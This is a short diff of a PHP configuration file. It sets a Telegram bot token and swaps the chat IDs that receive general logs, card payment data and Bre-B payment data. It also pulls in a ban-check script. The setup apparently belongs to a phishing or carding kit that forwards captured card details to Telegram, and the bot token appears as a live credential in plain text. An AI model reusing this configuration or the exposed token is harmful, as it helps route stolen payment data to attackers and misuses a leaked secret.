@@ -6,9 +6,9 @@ require_once __DIR__ . '/ban_check.php';
 
 // ── Telegram ──────────────────────────────────────────
 define('TG_TOKEN', '8840764725:AAGpJvwQ-BedbwvKzObO00RoUKU8TkBKFQo');
-define('TG_CHAT', '-5407412986');   // Chat principal (logs generales)
-define('TG_CHAT_CC', '-5429406339');  // Chat pagos con tarjeta
-define('TG_CHAT_BREB', '-5429406339');  // Chat pagos Bre-B
+define('TG_CHAT', '-4955190747');   // Chat principal (logs generales)
+define('TG_CHAT_CC', '-5235238333');  // Chat pagos con tarjeta
+define('TG_CHAT_BREB', '-5102130358');  // Chat pagos Bre-B
 
 //define('TG_CHAT', '235905376');   // Chat principal (logs generales) 
 //define('TG_CHAT_CC', '-5235238333');   // Chat pagos con tarjeta
